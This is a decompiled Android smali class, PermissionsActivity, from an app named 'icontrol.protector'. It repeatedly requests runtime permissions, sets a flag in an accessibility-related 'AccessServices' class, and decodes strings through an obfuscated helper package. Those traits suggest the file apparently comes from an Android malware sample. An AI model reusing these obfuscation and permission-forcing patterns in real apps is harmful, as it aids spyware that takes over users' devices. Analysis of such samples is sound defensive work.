.class public Lcom/icontrol/protector/PermissionsActivity;
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field private static c:Lcom/icontrol/protector/PermissionsActivity;


# instance fields
.field b:Z


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/icontrol/protector/PermissionsActivity;->b:Z

    return-void
.end method

.method private a(Ljava/lang/Boolean;)V
    .locals 2

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->D:Ljava/lang/String;

    invoke-static {v0, v1, p1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    sput-boolean p1, Lcom/icontrol/protector/AccessServices;->y:Z

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/16 p1, 0x8

    :try_start_0
    sput-object p0, Lcom/icontrol/protector/PermissionsActivity;->c:Lcom/icontrol/protector/PermissionsActivity;

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v1

    const/16 v2, 0x400

    invoke-virtual {v1, v2, v2}, Landroid/view/Window;->setFlags(II)V

    invoke-static {}, Lcom/icontrol/protector/k;->a()[Ljava/lang/String;

    move-result-object v1

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v1}, Lcom/icontrol/protector/k;->e(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    const/16 v3, 0x3db

    invoke-virtual {p0, v1, v3}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    sget-object v1, Lcom/icontrol/protector/My_Configs;->Click_Prim:Ljava/lang/String;

    new-array v0, v0, [B

    const/4 v3, 0x0

    const/16 v4, -0x3a

    aput-byte v4, v0, v3

    new-array v3, p1, [B

    fill-array-data v3, :array_0

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-direct {p0, v0}, Lcom/icontrol/protector/PermissionsActivity;->a(Ljava/lang/Boolean;)V

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_1

    :cond_0
    :goto_0
    const/16 v0, 0x22

    if-lt v2, v0, :cond_2

    sget-object v0, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    if-eqz v0, :cond_2

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/icontrol/protector/PermissionsActivity$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/PermissionsActivity$a;-><init>(Lcom/icontrol/protector/PermissionsActivity;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_2

    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    const/16 v1, 0x11

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    invoke-static {v1, p1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_2
    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x9t
        0x74t
        0x52t
        0x7ft
        -0x13t
        -0x20t
        0x33t
        -0x77t
    .end array-data

    :array_1
    .array-data 1
        -0x10t
        0x6et
        -0x17t
        -0x1at
        0x2et
        -0x77t
        -0x8t
        0x3at
        -0x12t
        0x62t
        -0xdt
        -0xbt
        0x2et
        -0x7bt
        -0xct
        0x3dt
        -0x2ct
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x4ft
        0xdt
        -0x63t
        -0x4at
        0x5ct
        -0x20t
        -0x6bt
        0x49t
    .end array-data
.end method

.method protected onDestroy()V
    .locals 1

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0}, Lcom/icontrol/protector/a;->i(Ljava/lang/Boolean;)V

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/PermissionsActivity;->c:Lcom/icontrol/protector/PermissionsActivity;

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 1

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x3db

    if-eq p1, p2, :cond_0

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/icontrol/protector/k;->a()[Ljava/lang/String;

    move-result-object p1

    array-length v0, p3

    if-lez v0, :cond_1

    const/4 v0, 0x0

    aget p3, p3, v0

    if-nez p3, :cond_1

    sget-object p2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-direct {p0, p2}, Lcom/icontrol/protector/PermissionsActivity;->a(Ljava/lang/Boolean;)V

    invoke-static {p2}, Lcom/icontrol/protector/a;->i(Ljava/lang/Boolean;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    invoke-static {p2, p1}, Lcom/icontrol/protector/k;->e(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_2

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    goto :goto_0

    :cond_1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    invoke-static {p3, p1}, Lcom/icontrol/protector/k;->e(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result p3

    if-nez p3, :cond_2

    invoke-virtual {p0, p1, p2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :cond_2
    :goto_0
    return-void
.end method

.method protected onResume()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    return-void
.end method
